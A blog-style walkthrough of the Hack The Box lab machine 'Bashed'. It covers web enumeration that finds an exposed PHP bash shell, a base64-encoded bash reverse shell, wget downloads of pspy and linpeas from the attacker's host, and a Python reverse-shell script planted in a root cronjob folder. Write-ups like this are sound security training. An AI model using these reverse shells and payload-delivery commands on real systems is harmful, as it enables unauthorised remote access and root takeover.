---
title: "HTB - Bashed"
categories: [box]
date: 2022-11-01
comments: true
image: /images/walkthroughs/hackthebox/bashed/logo.png
favicon: /images/walkthroughs/hackthebox/bashed/logo.png
description: HTB - Bashed walkthrough
---

# Bashed

<p align="center">
  <img src="/images/walkthroughs/hackthebox/bashed/banner.png" width="70%"/>
</p>


## Summary

Bashed is an easy box where we have direct access to command execution after some web path enumeration under _/dev_. We can go for a quick revshell and get the user flag since www-data have read permissions over axerrel user directory.

For privesc, we see that there is a cronjob running as root a set of scripts (with any name following this regex: \*.py) on the /scripts folder, owned by scriptmanager user. We can run sudo commands as scriptmanager, therefore, we create a python revshell on that folder and wait its execution to get a root shell.


## Enumeration

- nmap

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-01 12:05 EST
Nmap scan report for 10.129.228.35
Host is up (0.043s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

- gobuster

```bash
gobuster dir -u "http://10.129.228.35" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x php,html,txt
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.228.35
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/12/01 12:06:04 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.hta.php             (Status: 403) [Size: 296]
/.hta.html            (Status: 403) [Size: 297]
/.htaccess            (Status: 403) [Size: 297]
/.hta.txt             (Status: 403) [Size: 296]
/.htaccess.php        (Status: 403) [Size: 301]
/.htaccess.txt        (Status: 403) [Size: 301]
/.htaccess.html       (Status: 403) [Size: 302]
/.htpasswd            (Status: 403) [Size: 297]
/.htpasswd.html       (Status: 403) [Size: 302]
/.htpasswd.php        (Status: 403) [Size: 301]
/.htpasswd.txt        (Status: 403) [Size: 301]
/about.html           (Status: 200) [Size: 8193]
/config.php           (Status: 200) [Size: 0]
/contact.html         (Status: 200) [Size: 7805]
/css                  (Status: 301) [Size: 312] [--> http://10.129.228.35/css/]
/dev                  (Status: 301) [Size: 312] [--> http://10.129.228.35/dev/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.228.35/fonts/]
/images               (Status: 301) [Size: 315] [--> http://10.129.228.35/images/]
/index.html           (Status: 200) [Size: 7743]
/index.html           (Status: 200) [Size: 7743]
/js                   (Status: 301) [Size: 311] [--> http://10.129.228.35/js/]
/php                  (Status: 301) [Size: 312] [--> http://10.129.228.35/php/]
/server-status        (Status: 403) [Size: 301]
/single.html          (Status: 200) [Size: 7477]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.228.35/uploads/]
```

We land into a webside that says it has PHP Bash shell implemented

<p align="center">
  <img src="/images/walkthroughs/hackthebox/bashed/1_0_web.png" width="90%"/>
</p>


Also we see the _/dev_ path. Within it we can see the bash:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/bashed/1_1_bash.png" width="70%"/>
</p>


<p align="center">
  <img src="/images/walkthroughs/hackthebox/bashed/2_0_www.png" width="70%"/>
</p>

We input the following commands to get hte revshell

```bash
# Get the payload
echo 'bash  -i >& /dev/tcp/10.10.14.2/5453  0>&1  ' | base64

# Execute it
echo "YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi81NDUzICAwPiYxICAK" | base64 -d | bash
```

We get the privesc scripts into the machine:

```bash
wget http://10.10.14.2:5454/pspy64
wget http://10.10.14.2:5454/linpeas.sh
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/bashed/3_0_priv.png" width="80%"/>
</p>


We can see a cronjob running the python scripts within /scripts as root, but that folder is owned by scriptmanager user:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/bashed/4_0_pspy.png" width="90%"/>
</p>

Also, test.txt and test.py files in that directory:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/bashed/4_1_scripts.png" width="80%"/>
</p>

Checking the linpeas output, we can see the users **arrexel** within the sudo group and the **scriptmanager**, owner of the folder used in the cronjob:

```bash
╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                            
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=1000(arrexel) gid=1000(arrexel) groups=1000(arrexel),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
```

Apparently we can read user flag so we grab it:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/bashed/5_0_user.png" width="80%"/>
</p>


## Privesc

I didn't try sudo -l because I never saw www-data with sudo capabilities, but seems like we can run sudo with no password for user scriptmanager:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/bashed/5_1_sudo.png" width="80%"/>
</p>

So we create a revshell using sudo as scriptmanager, then wait for it to execute as root (id 0):

```bash
sudo -u scriptmanager nano /scripts/rev.py
```

```python
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.2",5456))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

And we have the revshell

<p align="center">
  <img src="/images/walkthroughs/hackthebox/bashed/6_0_root.png" width="95%"/>
</p>

